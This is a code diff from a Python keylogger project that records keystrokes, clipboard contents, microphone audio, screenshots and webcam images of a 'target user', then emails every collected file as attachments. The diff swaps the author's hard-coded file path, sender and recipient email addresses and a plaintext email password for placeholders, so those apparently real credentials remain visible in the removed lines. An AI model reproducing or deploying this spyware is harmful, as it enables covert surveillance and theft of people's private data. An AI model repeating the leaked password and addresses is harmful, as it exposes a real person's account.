@@ -27,11 +27,11 @@ clipboard_information = "clipboard_trial.txt"     # Record Copy paste content
 audio_information = "audio_trial"             # Record audio of user
 screenshot_information = "screenshot_trial"   # Screen record image
 
-file_path = "C:\\Users\\Pundaree\\PycharmProjects\\Keylogger\\trial"   # Filepath of project
-extend = "\\"                                                       # Just an extension for path symbol
-email_address = "manjunadh.kandavalli.18cse@bmu.edu.in"             # From email address
-password = "XWA517Nm"                                               # Password
-toaddr = "manjunadhkandavalli@gmail.com"
+file_path = "  Enter the file path to which you want to store the result   "   # Filepath of project
+extend = "\\"                                                                  # Just an extension for path symbol
+email_address = "Email Address"                                                # From email address
+password = " Password"                                                         # Password
+toaddr = " Enter To Address Email"
 
 microphone_time = 20            # Microphone recording time period
 count = 0                       # This is another counter keeping tab of no.of keys pressed
@@ -107,9 +107,9 @@ def send_email(toaddr): # To send email
     msg["Subject"] = "Keylogger exploits:"  # Subject line
     msg.set_content('Contains attachments for Keylogger,Screenshots,Audio Clips,Webcam Images,Clipboard and System Settings') # EMail Body
 
-    files_in_dir = [f for f in listdir('C:\\Users\\Pundaree\\PycharmProjects\\Keylogger\\trial') if isfile(join('C:\\Users\\Pundaree\\PycharmProjects\\Keylogger\\trial', f))]
+    files_in_dir = [f for f in listdir('File path') if isfile(join('File Path', f))]
     #print(files_in_dir) # files_in_dir is used to retrieve all files in keylogger/trial directory
-    outdir = 'C:\\Users\\Pundaree\\PycharmProjects\\Keylogger\\trial'
+    outdir = 'File Path'
     for file in files_in_dir: # Looping through each file in directory,read file,give filename and adding attachment
         with open(os.path.join(outdir, file), 'rb') as f:
             file_data = f.read() # Read file
@@ -126,7 +126,7 @@ def Camera_Capture(number_of_iterations):
     cam = cv2.VideoCapture(0, cv2.CAP_DSHOW) # Create an object of class VideoCapture using Webcam 0 and DirectShow API Preference
     ret, frame = cam.read() # Capture webcam image by frame  (return value,image)
     img_name = "Target user pic at " # For Naming file
-    outdir = 'C:\\Users\\Pundaree\\PycharmProjects\\Keylogger\\trial'
+    outdir = 'File Path'
     cv2.imwrite(os.path.join(outdir , img_name + str(number_of_iterations) + " iteration.png"), frame) # Write the given frame with the given name
     cam.release() # Release resources
 
